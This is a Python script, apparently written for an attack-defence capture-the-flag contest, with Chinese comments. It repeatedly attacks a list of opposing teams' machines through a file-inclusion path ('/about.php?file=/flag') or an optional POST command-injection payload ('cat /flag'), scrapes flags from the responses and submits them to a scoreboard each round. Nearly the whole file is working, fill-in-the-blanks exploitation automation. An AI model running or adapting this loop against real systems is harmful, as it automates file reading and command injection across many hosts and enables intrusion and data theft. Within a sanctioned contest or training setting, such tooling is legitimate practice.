#!/usr/bin/env python3
import json, re, socket, time, requests

# ==================== 等下找到了直接填下面这几个空位 ====================

# 1. 官方计分板信息
TOKEN     = "<submit token>"          # 填你们队伍的 submit token
HOST      = "<gameserver>"            # 填计分板的 IP (不要带 http://)

# 2. 其他队伍的靶机 IP 列表 (把 i != 5 里的 5 改成你们自己的队伍号，跳过自己！)
IPS       = [f"10.10.1.{i}" for i in range(1, 16) if i != 5]
PORT      = 80                        # 题目 Web 端口

# 3. 【核心填空区】等下找到靶机上 flag 的位置和漏洞路径后，填在这里：
FLAG_PATH = "/flag"                   # <--- 靶机里存放 flag 的路径 (如 /flag 或 /var/www/flag.txt)
VULN_PATH = f"/about.php?file={FLAG_PATH}"  # <--- 漏洞网页路径 (可以直接用上面的 FLAG_PATH)

# 如果是 GET 攻击，把 POST_DATA 设为 None
# 如果是 POST 攻击，把 POST_DATA 改成字典，例如: {"cmd": f"cat {FLAG_PATH}"}
POST_DATA = None
# POST_DATA = {"cmd": f"cat {FLAG_PATH}"}

# 4. 每轮刷新时间：2 分钟 (120 秒)
ROUND_SECONDS = 120

# ========================================================================


def submit_flags_to_gameserver(flag_list):
    """官方给的 PUT /flags 提交函数（原封不动整合）"""
    if not flag_list:
        return
    body = json.dumps(list(flag_list))
    req = (
        f"PUT /flags HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"X-Team-Token: {TOKEN}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
        f"{body}"
    )
    try:
        with socket.create_connection((HOST, 80), timeout=5) as s:
            s.sendall(req.encode())
            resp = s.recv(4096).decode(errors="replace")
            print(f"    -> [官方平台响应]: {resp.splitlines()[-1] if resp else 'Empty'}")
    except Exception as e:
        print(f"    -> [!] 提交到 Gameserver 失败: {e}")


submitted_flags = set()
round_num = 1

while True:
    start_time = time.time()
    print(f"\n==================== 第 {round_num} 轮收割开始 ({time.strftime('%H:%M:%S')}) ====================")

    for ip in IPS:
        url = f"http://{ip}:{PORT}{VULN_PATH}"
        try:
            # 自动判断发 GET 还是 POST (超时设为 3 秒，防止死机拖慢 2 分钟节奏)
            if POST_DATA is None:
                r = requests.get(url, timeout=3)
            else:
                r = requests.post(url, data=POST_DATA, timeout=3)

            # 自动提取 [A-Z0-9]{31}= (或 ihack26{...}) 格式的 Flag
            found = re.findall(r"(?:[A-Z0-9]{31}=|ihack26\{[^}]+\})", r.text)
            if found:
                new_flags = []
                for flg in found:
                    if flg not in submitted_flags:
                        print(f"[+] 成功从 {ip} 拿到新 Flag: {flg}")
                        submitted_flags.add(flg)
                        new_flags.append(flg)
                        with open("flags.txt", "a") as f:
                            f.write(flg + "\n")
                    else:
                        print(f"[*] {ip} 的 Flag 本轮已交过，跳过: {flg}")

                # 抓到新 Flag 立即提交，绝不等整轮结束（防止 2 分钟到期失效！）
                if new_flags:
                    submit_flags_to_gameserver(new_flags)
            else:
                print(f"[-] {ip} 未匹配到 Flag，返回片段: {r.text.strip()[:50]!r}")
        except Exception as e:
            print(f"[-] {ip} 连接超时或错误: {e}")

        # 严格遵守比赛规则：每打一家必须延迟 >= 2 秒！
        time.sleep(2.5)

    # 自动计算本轮打靶已经花掉的秒数，精准对齐 2 分钟 (120 秒) 一轮！
    elapsed = time.time() - start_time
    wait_sec = max(5, int(ROUND_SECONDS - elapsed))
    print(f"[*] 第 {round_num} 轮打靶耗时 {int(elapsed)} 秒，休息 {wait_sec} 秒迎接下一个 2 分钟新 Flag...")
    round_num += 1
    time.sleep(wait_sec)
